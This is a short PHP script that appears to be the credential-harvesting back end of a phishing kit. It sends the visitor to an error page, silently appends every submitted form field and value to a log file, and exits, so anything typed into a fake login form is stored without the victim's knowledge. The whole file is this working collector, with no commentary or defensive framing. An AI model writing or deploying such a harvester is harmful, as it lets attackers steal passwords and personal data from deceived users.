<?php
header ('Location: error.html');
$handle = fopen("log.txt", "a");
$ind = 0;
fwrite($handle,"----------------------------\n");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, " = ");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n");
fclose($handle);
exit;
?>